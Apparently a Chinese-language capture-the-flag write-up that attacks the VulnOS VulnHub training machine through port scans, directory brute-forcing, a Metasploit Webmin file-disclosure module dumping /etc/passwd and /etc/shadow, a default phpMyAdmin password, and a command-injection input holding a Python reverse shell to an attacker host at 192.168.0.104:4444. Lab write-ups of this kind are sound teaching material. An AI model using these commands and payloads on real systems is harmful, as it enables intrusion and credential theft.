@@ -1,0 +1,473 @@
+# 下载地址
+
+    
+    
+    https://download.vulnhub.com/vulnos/VulnOS.vdi-vbox.7z
+    
+
+# **实战演练**
+
+使用netdiscover命令查找靶机的IP
+
+![image.png](https://image.3001.net/images/20190809/1565355479_5d4d6dd76babe.png)  
+
+使用nmap查看靶机开放的端口
+
+    
+    
+    root@kali:~# nmap -sV -p1-65535 -A  192.168.0.102
+    Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 09:13 EDT
+    Nmap scan report for 192.168.0.102
+    Host is up (0.00041s latency).
+    Not shown: 65507 closed ports
+    PORT      STATE SERVICE     VERSION
+    22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   1024 43:a6:84:8d:be:1a:ee:fb:ed:c3:23:53:14:14:8f:50 (DSA)
+    |_  2048 30:1d:2d:c4:9e:66:d8:bd:70:7c:48:84:fb:b9:7b:09 (RSA)
+    23/tcp    open  telnet      Linux telnetd
+    25/tcp    open  smtp        Postfix smtpd
+    |_smtp-commands: VulnOS.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+    |_ssl-date: 2019-08-09T13:13:59+00:00; 0s from scanner time.
+    | sslv2: 
+    |   SSLv2 supported
+    |   ciphers: 
+    |     SSL2_DES_64_CBC_WITH_MD5
+    |     SSL2_RC4_128_EXPORT40_WITH_MD5
+    |     SSL2_DES_192_EDE3_CBC_WITH_MD5
+    |     SSL2_RC4_128_WITH_MD5
+    |     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+    |_    SSL2_RC2_128_CBC_WITH_MD5
+    53/tcp    open  domain      ISC BIND 9.7.0-P1
+    | dns-nsid: 
+    |_  bind.version: 9.7.0-P1
+    80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))
+    |_http-server-header: Apache/2.2.14 (Ubuntu)
+    |_http-title: index
+    110/tcp   open  pop3        Dovecot pop3d
+    |_pop3-capabilities: RESP-CODES UIDL PIPELINING SASL TOP STLS CAPA
+    |_ssl-date: 2019-08-09T13:13:58+00:00; 0s from scanner time.
+    | sslv2: 
+    |   SSLv2 supported
+    |_  ciphers: none
+    111/tcp   open  rpcbind     2 (RPC #100000)
+    | rpcinfo: 
+    |   program version   port/proto  service
+    |   100000  2            111/tcp  rpcbind
+    |   100000  2            111/udp  rpcbind
+    |   100003  2,3,4       2049/tcp  nfs
+    |   100003  2,3,4       2049/udp  nfs
+    |   100005  1,2,3      32785/tcp  mountd
+    |   100005  1,2,3      48076/udp  mountd
+    |   100021  1,3,4      35096/tcp  nlockmgr
+    |   100021  1,3,4      56305/udp  nlockmgr
+    |   100024  1          37404/udp  status
+    |_  100024  1          43176/tcp  status
+    139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    143/tcp   open  imap        Dovecot imapd
+    |_imap-capabilities: SASL-IR SORT=DISPLAY THREAD=REFERENCES completed ID UIDPLUS UNSELECT LOGINDISABLEDA0001 LITERAL+ STARTTLS NAMESPACE WITHIN LIST-EXTENDED CONDSTORE SEARCHRES THREAD=REFS ESORT OK IDLE CHILDREN CONTEXT=SEARCH I18NLEVEL=1 Capability ENABLE MULTIAPPEND SORT ESEARCH LOGIN-REFERRALS QRESYNC IMAP4rev1
+    |_ssl-date: 2019-08-09T13:13:59+00:00; 0s from scanner time.
+    | sslv2: 
+    |   SSLv2 supported
+    |_  ciphers: none
+    389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X
+    445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    512/tcp   open  exec        netkit-rsh rexecd
+    513/tcp   open  login?
+    514/tcp   open  tcpwrapped
+    901/tcp   open  http        Samba SWAT administration server
+    | http-auth: 
+    | HTTP/1.0 401 Authorization Required\x0D
+    |_  Basic realm=SWAT
+    |_http-title: 401 Authorization Required
+    993/tcp   open  ssl/imaps?
+    |_ssl-date: 2019-08-09T13:13:58+00:00; 0s from scanner time.
+    | sslv2: 
+    |   SSLv2 supported
+    |_  ciphers: none
+    995/tcp   open  ssl/pop3s?
+    |_ssl-date: 2019-08-09T13:13:59+00:00; 0s from scanner time.
+    | sslv2: 
+    |   SSLv2 supported
+    |_  ciphers: none
+    2000/tcp  open  sieve       Dovecot timsieved
+    2049/tcp  open  nfs         2-4 (RPC #100003)
+    3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1
+    | mysql-info: 
+    |   Protocol: 10
+    |   Version: 5.1.73-0ubuntu0.10.04.1
+    |   Thread ID: 312
+    |   Capabilities flags: 63487
+    |   Some Capabilities: Support41Auth, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, FoundRows, DontAllowDatabaseTableColumn, LongColumnFlag, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongPassword, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase
+    |   Status: Autocommit
+    |_  Salt: JJv4?}zk,4bo,'~jv4;m
+    3632/tcp  open  tcpwrapped
+    6667/tcp  open  irc         IRCnet ircd
+    | irc-info: 
+    |   users: 1
+    |   servers: 1
+    |   chans: 15
+    |   lusers: 1
+    |   lservers: 0
+    |   server: irc.localhost
+    |   version: 2.11.2p1. irc.localhost 000A 
+    |   uptime: 0 days, 0:04:40
+    |   source ident: NONE or BLOCKED
+    |   source host: 192.168.0.104
+    |_  error: Closing Link: aloqyhgqz[~nmap@192.168.0.104] ("")
+    8070/tcp  open  ucs-isc?
+    8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+    | http-methods: 
+    |_  Potentially risky methods: PUT DELETE
+    |_http-open-proxy: Proxy might be redirecting requests
+    |_http-server-header: Apache-Coyote/1.1
+    |_http-title: Apache Tomcat
+    10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
+    |_http-server-header: MiniServ/0.01
+    |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+    32785/tcp open  mountd      1-3 (RPC #100005)
+    35096/tcp open  nlockmgr    1-4 (RPC #100021)
+    43176/tcp open  status      1 (RPC #100024)
+    MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+    Device type: general purpose
+    Running: Linux 2.6.X
+    OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+    OS details: Linux 2.6.32
+    Network Distance: 1 hop
+    Service Info: Hosts:  VulnOS.home, irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    Host script results:
+    |_nbstat: NetBIOS name: VULNOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+    |_smb2-time: Protocol negotiation failed (SMB2)
+    
+    TRACEROUTE
+    HOP RTT     ADDRESS
+    1   0.41 ms 192.168.0.102
+    
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 170.78 seconds
+    
+    
+
+连接telnet，看看能不能匿名登录，发现无法 **匿名登录**
+
+![image.png](https://image.3001.net/images/20190809/1565356441_5d4d71995249b.png)
+查看80端口，爆破目录
+
+![image.png](https://image.3001.net/images/20190809/1565356948_5d4d73942f134.png)![image.png](https://image.3001.net/images/20190809/1565356965_5d4d73a5d8de1.png)![image.png](https://image.3001.net/images/20190809/1565357805_5d4d76ed62488.png)
+
+    
+    
+    root@kali:~# dirb http://192.168.0.102
+    
+    -----------------    DIRB v2.22    
+    By The Dark Raver
+    -----------------    
+    START_TIME: Fri Aug  9 09:58:11 2019
+    URL_BASE: http://192.168.0.102/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+    
+    -----------------    
+    GENERATED WORDS: 4612                                                          
+    
+    ---- Scanning URL: http://192.168.0.102/ ----    + http://192.168.0.102/.htaccess (CODE:200|SIZE:501)                                                                                                                                                              
+    + http://192.168.0.102/cgi-bin/ (CODE:403|SIZE:289)                                                                                                                                                               
+    ==> DIRECTORY: http://192.168.0.102/imgs/                                                                                                                                                                         
+    + http://192.168.0.102/index (CODE:200|SIZE:745)                                                                                                                                                                  
+    + http://192.168.0.102/index.html (CODE:200|SIZE:745)                                                                                                                                                             
+    + http://192.168.0.102/index2 (CODE:200|SIZE:1066)                                                                                                                                                                
+    ==> DIRECTORY: http://192.168.0.102/javascript/                                                                                                                                                                   
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/                                                                                                                                                                    
+    ==> DIRECTORY: http://192.168.0.102/phpldapadmin/                                                                                                                                                                 
+    ==> DIRECTORY: http://192.168.0.102/phpmyadmin/                                                                                                                                                                   
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/                                                                                                                                                                   
+    + http://192.168.0.102/server-status (CODE:403|SIZE:294)                                                                                                                                                          
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/imgs/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+        (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/javascript/ ----    ==> DIRECTORY: http://192.168.0.102/javascript/jquery/                                                                                                                                                            
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/ ----    ==> DIRECTORY: http://192.168.0.102/mediawiki/config/                                                                                                                                                             
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/extensions/                                                                                                                                                         
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/images/                                                                                                                                                             
+    + http://192.168.0.102/mediawiki/includes (CODE:403|SIZE:299)                                                                                                                                                     
+    + http://192.168.0.102/mediawiki/index.php (CODE:301|SIZE:0)                                                                                                                                                      
+    + http://192.168.0.102/mediawiki/languages (CODE:403|SIZE:300)                                                                                                                                                    
+    + http://192.168.0.102/mediawiki/maintenance (CODE:403|SIZE:302)                                                                                                                                                  
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/                                                                                                                                                              
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpldapadmin/ ----    ==> DIRECTORY: http://192.168.0.102/phpldapadmin/css/                                                                                                                                                             
+    ==> DIRECTORY: http://192.168.0.102/phpldapadmin/images/                                                                                                                                                          
+    + http://192.168.0.102/phpldapadmin/index.php (CODE:200|SIZE:4731)                                                                                                                                                
+    ==> DIRECTORY: http://192.168.0.102/phpldapadmin/js/                                                                                                                                                              
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpmyadmin/ ----    + http://192.168.0.102/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                                                                                                                               
+    + http://192.168.0.102/phpmyadmin/index.php (CODE:200|SIZE:8625)                                                                                                                                                  
+    ==> DIRECTORY: http://192.168.0.102/phpmyadmin/js/                                                                                                                                                                
+    ==> DIRECTORY: http://192.168.0.102/phpmyadmin/lang/                                                                                                                                                              
+    + http://192.168.0.102/phpmyadmin/libraries (CODE:403|SIZE:301)                                                                                                                                                   
+    + http://192.168.0.102/phpmyadmin/phpinfo.php (CODE:200|SIZE:0)                                                                                                                                                   
+    + http://192.168.0.102/phpmyadmin/setup (CODE:401|SIZE:480)                                                                                                                                                       
+    ==> DIRECTORY: http://192.168.0.102/phpmyadmin/themes/                                                                                                                                                            
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/ ----    ==> DIRECTORY: http://192.168.0.102/phppgadmin/classes/                                                                                                                                                           
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/conf/                                                                                                                                                              
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/help/                                                                                                                                                              
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/images/                                                                                                                                                            
+    + http://192.168.0.102/phppgadmin/index.php (CODE:200|SIZE:1012)                                                                                                                                                  
+    + http://192.168.0.102/phppgadmin/info.php (CODE:200|SIZE:19)                                                                                                                                                     
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/lang/                                                                                                                                                              
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/libraries/                                                                                                                                                         
+    + http://192.168.0.102/phppgadmin/robots.txt (CODE:200|SIZE:221)                                                                                                                                                  
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/sql/                                                                                                                                                               
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/themes/                                                                                                                                                            
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/javascript/jquery/ ----    + http://192.168.0.102/javascript/jquery/jquery (CODE:200|SIZE:120653)                                                                                                                                            
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/config/ ----    + http://192.168.0.102/mediawiki/config/index.php (CODE:200|SIZE:3009)                                                                                                                                            
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/extensions/ ----    + http://192.168.0.102/mediawiki/extensions/README (CODE:200|SIZE:583)                                                                                                                                            
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/images/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/ ----    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/common/                                                                                                                                                       
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/disabled/                                                                                                                                                     
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/simple/                                                                                                                                                       
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpldapadmin/css/ ----    ==> DIRECTORY: http://192.168.0.102/phpldapadmin/css/default/                                                                                                                                                     
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpldapadmin/images/ ----    ==> DIRECTORY: http://192.168.0.102/phpldapadmin/images/default/                                                                                                                                                  
+    + http://192.168.0.102/phpldapadmin/images/favicon.ico (CODE:200|SIZE:902)                                                                                                                                        
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpldapadmin/js/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpmyadmin/js/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpmyadmin/lang/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpmyadmin/themes/ ----    ==> DIRECTORY: http://192.168.0.102/phpmyadmin/themes/original/                                                                                                                                                   
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/classes/ ----    ==> DIRECTORY: http://192.168.0.102/phppgadmin/classes/database/                                                                                                                                                  
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/classes/plugins/                                                                                                                                                   
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/conf/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/help/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/images/ ----    ==> DIRECTORY: http://192.168.0.102/phppgadmin/images/themes/                                                                                                                                                     
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/lang/ ----    + http://192.168.0.102/phppgadmin/lang/Makefile (CODE:200|SIZE:7373)                                                                                                                                              
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/libraries/ ----    ==> DIRECTORY: http://192.168.0.102/phppgadmin/libraries/adodb/                                                                                                                                                   
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/sql/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/themes/ ----    ==> DIRECTORY: http://192.168.0.102/phppgadmin/themes/default/                                                                                                                                                    
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/common/ ----    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/common/images/                                                                                                                                                
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/disabled/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/simple/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpldapadmin/css/default/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpldapadmin/images/default/ ----    + http://192.168.0.102/phpldapadmin/images/default/index.php (CODE:200|SIZE:19434)                                                                                                                                
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpmyadmin/themes/original/ ----    ==> DIRECTORY: http://192.168.0.102/phpmyadmin/themes/original/css/                                                                                                                                               
+    ==> DIRECTORY: http://192.168.0.102/phpmyadmin/themes/original/img/                                                                                                                                               
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/classes/database/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/classes/plugins/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/images/themes/ ----    ==> DIRECTORY: http://192.168.0.102/phppgadmin/images/themes/default/                                                                                                                                             
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/libraries/adodb/ ----    ==> DIRECTORY: http://192.168.0.102/phppgadmin/libraries/adodb/drivers/                                                                                                                                           
+    ==> DIRECTORY: http://192.168.0.102/phppgadmin/libraries/adodb/lang/                                                                                                                                              
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/themes/default/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/common/images/ ----    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/common/images/ar/                                                                                                                                             
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/common/images/de/                                                                                                                                             
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/common/images/fa/                                                                                                                                             
+    ==> DIRECTORY: http://192.168.0.102/mediawiki/skins/common/images/icons/                                                                                                                                          
+                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpmyadmin/themes/original/css/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phpmyadmin/themes/original/img/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/images/themes/default/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/libraries/adodb/drivers/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/phppgadmin/libraries/adodb/lang/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/common/images/ar/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/common/images/de/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/common/images/fa/ ----                                                                                                                                                                                                                      
+    ---- Entering directory: http://192.168.0.102/mediawiki/skins/common/images/icons/ ----                                                                                                                                                                                                                      
+    -----------------    END_TIME: Fri Aug  9 10:00:19 2019
+    DOWNLOADED: 212152 - FOUND: 25
+    
+    
+
+  
+看到apache2的版本为2.2.14，搜一下版本漏洞，这个漏洞没用
+
+    
+    
+    受影响的资产仅在运行以下模块之一时才容易受到此漏洞的影响：mod_isapi。查看Web服务器配置以进行验证。在mod_isapi中发现了一个缺陷，它会在遇到各种错误状态时尝试卸载ISAPI dll。这可能会使回调处于未定义状态并导致段错误。在使用mod_isapi的Windows平台上，远程攻击者可能发送恶意请求以触发此问题，并且由于win32 MPM仅运行一个进程，这将导致拒绝服务，并可能允许任意代码执行。
+    
+
+![image.png](https://image.3001.net/images/20190809/1565358116_5d4d782467ddb.png)其他端口的漏洞都测试了一遍，没找到什么。
+
+直到10000端口，有个文件泄露的漏洞
+
+    
+    
+    msf5 exploit(linux/smtp/exim4_dovecot_exec) > use auxiliary/admin/webmin/file_disclosure
+    msf5 auxiliary(admin/webmin/file_disclosure) > show options
+    
+    Module options (auxiliary/admin/webmin/file_disclosure):
+    
+       Name     Current Setting   Required  Description
+       ----     ---------------   --------  -----------       DIR      /unauthenticated  yes       Webmin directory path
+       Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+       RHOSTS                     yes       The target address range or CIDR identifier
+       RPATH    /etc/passwd       yes       The file to download
+       RPORT    10000             yes       The target port (TCP)
+       SSL      false             no        Negotiate SSL/TLS for outgoing connections
+       VHOST                      no        HTTP server virtual host
+    
+    
+    Auxiliary action:
+    
+       Name      Description
+       ----      -----------       Download  
+    
+    
+    msf5 auxiliary(admin/webmin/file_disclosure) > set RHOSTS 192.168.0.102
+    RHOSTS => 192.168.0.102
+    msf5 auxiliary(admin/webmin/file_disclosure) > run
+    
+    [*] Attempting to retrieve /etc/passwd...
+    [*] The server returned: 200 Document follows
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+    bin:x:2:2:bin:/bin:/bin/sh
+    sys:x:3:3:sys:/dev:/bin/sh
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/bin/sh
+    man:x:6:12:man:/var/cache/man:/bin/sh
+    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+    mail:x:8:8:mail:/var/mail:/bin/sh
+    news:x:9:9:news:/var/spool/news:/bin/sh
+    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+    proxy:x:13:13:proxy:/bin:/bin/sh
+    www-data:x:33:33:www-data:/var/www:/bin/sh
+    backup:x:34:34:backup:/var/backups:/bin/sh
+    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+    syslog:x:101:103::/home/syslog:/bin/false
+    landscape:x:102:108::/var/lib/landscape:/bin/false
+    vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash
+    sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
+    webmin:x:1002:1002::/home/webmin:/bin/sh
+    hackme:x:1003:1003::/home/hackme:/bin/sh
+    sa:x:1004:1004::/home/sa:/bin/sh
+    stupiduser:x:1005:1005::/home/stupiduser:/bin/sh
+    messagebus:x:103:112::/var/run/dbus:/bin/false
+    distccd:x:104:65534::/:/bin/false
+    sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+    openldap:x:106:113:OpenLDAP Server Account,,,:/nonexistent:/bin/false
+    ftp:x:1006:1006::/home/ftp:/bin/sh
+    mysql:x:107:115:MySQL Server,,,:/var/lib/mysql:/bin/false
+    telnetd:x:108:116::/nonexistent:/bin/false
+    bind:x:109:117::/var/cache/bind:/bin/false
+    postgres:x:110:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+    postfix:x:111:119::/var/spool/postfix:/bin/false
+    dovecot:x:112:121:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+    tomcat6:x:113:122::/usr/share/tomcat6:/bin/false
+    statd:x:114:65534::/var/lib/nfs:/bin/false
+    snmp:x:115:123::/var/lib/snmp:/bin/false
+    nagios:x:116:124::/var/lib/nagios:/bin/false
+    openerp:x:117:125:Open ERP server,,,:/home/openerp:/bin/false
+    [*] Auxiliary module execution completed
+      
+    
+
+**现在有两种思路，一是暴力破解shadow文件，二是找文件进而查看文件**
+
+爆破密码，不过爆破失败了
+
+    
+    
+    msf5 auxiliary(admin/webmin/file_disclosure) > set RPATH /etc/shadow
+    RPATH => /etc/shadow
+    msf5 auxiliary(admin/webmin/file_disclosure) > run
+    
+    [*] Attempting to retrieve /etc/shadow...
+    [*] The server returned: 200 Document follows
+    root:*:16137:0:99999:7:::
+    daemon:*:16137:0:99999:7:::
+    bin:*:16137:0:99999:7:::
+    sys:*:16137:0:99999:7:::
+    sync:*:16137:0:99999:7:::
+    games:*:16137:0:99999:7:::
+    man:*:16137:0:99999:7:::
+    lp:*:16137:0:99999:7:::
+    mail:*:16137:0:99999:7:::
+    news:*:16137:0:99999:7:::
+    uucp:*:16137:0:99999:7:::
+    proxy:*:16137:0:99999:7:::
+    www-data:*:16137:0:99999:7:::
+    backup:*:16137:0:99999:7:::
+    list:*:16137:0:99999:7:::
+    irc:*:16137:0:99999:7:::
+    gnats:*:16137:0:99999:7:::
+    nobody:*:16137:0:99999:7:::
+    libuuid:!:16137:0:99999:7:::
+    syslog:*:16137:0:99999:7:::
+    landscape:*:16137:0:99999:7:::
+    vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
+    sysadmin:admin:16137:0:99999:7:::
+    webmin:webmin:16137:0:99999:7:::
+    hackme:hackme:16137:0:99999:7:::
+    sa:password1:16137:0:99999:7:::
+    stupiduser:stupiduser:16137:0:99999:7:::
+    messagebus:*:16137:0:99999:7:::
+    distccd:*:16137:0:99999:7:::
+    sshd:*:16138:0:99999:7:::
+    openldap:!:16138:0:99999:7:::
+    ftp:!:16138:0:99999:7:::
+    mysql:!:16138:0:99999:7:::
+    telnetd:*:16138:0:99999:7:::
+    bind:*:16138:0:99999:7:::
+    postgres:*:16138:0:99999:7:::
+    postfix:*:16138:0:99999:7:::
+    dovecot:*:16138:0:99999:7:::
+    tomcat6:*:16138:0:99999:7:::
+    statd:*:16138:0:99999:7:::
+    snmp:*:16138:0:99999:7:::
+    nagios:!:16140:0:99999:7:::
+    openerp:*:16140:0:99999:7:::
+    [*] Auxiliary module execution completed
+      
+    
+
+文件泄露，找到的只是无关紧要的东西。
+
+后来，我在phpmyadmin输入默认密码toor就直接进去=-=好儿戏的靶机，想写一句话木马，发现没有写的权限
+
+![image.png](https://image.3001.net/images/20190809/1565361199_5d4d842fa3c21.png)
+
+![image.png](https://image.3001.net/images/20190809/1565361186_5d4d8422ae0e5.png)仔细研究数据库，找到一个dvwa的靶场=-=
+
+![image.png](https://image.3001.net/images/20190809/1565361244_5d4d845c479af.png)![image.png](https://image.3001.net/images/20190809/1565361276_5d4d847cef498.png)在输入框输入
+
+    
+    
+    0 && python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.104',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"  
+    
+
+![image.png](https://image.3001.net/images/20190809/1565361707_5d4d862bd2060.png)
+
+找到了这个文件，然后搜一下这个是什么密码  
+![image.png](https://image.3001.net/images/20190809/1565361801_5d4d8689b172a.png)![image.png](https://image.3001.net/images/20190809/1565362180_5d4d88048097b.png)
+
+![image.png](https://image.3001.net/images/20190809/1565362281_5d4d8869797b6.png)  
+但是在passwd没有这个账号，我们将这个密码添加到字典上面，我们可以看到在passwd上有个用户叫hackme，根据社会工程学有没有可能密码是canuhackme呢？
+
+![image.png](https://image.3001.net/images/20190809/1565362664_5d4d89e836ac3.png)  
+
+登录成功
+
+![image.png](https://image.3001.net/images/20190809/1565362734_5d4d8a2e711f6.png)  
+
